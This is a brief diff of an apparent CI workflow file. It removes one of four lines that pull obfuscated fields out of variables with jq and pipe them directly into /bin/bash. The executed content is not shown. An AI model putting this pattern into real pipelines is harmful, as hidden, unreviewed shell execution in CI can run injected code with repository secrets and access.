@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$t8" | jq -r .ujewq0234 | /bin/bash
           printf '%s' "$i145" | jq -r .yr9 | /bin/bash
           echo $tael9818 | jq -r .vtmz207 | /bin/bash
-          echo $vd6 | jq -r .wx7967 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
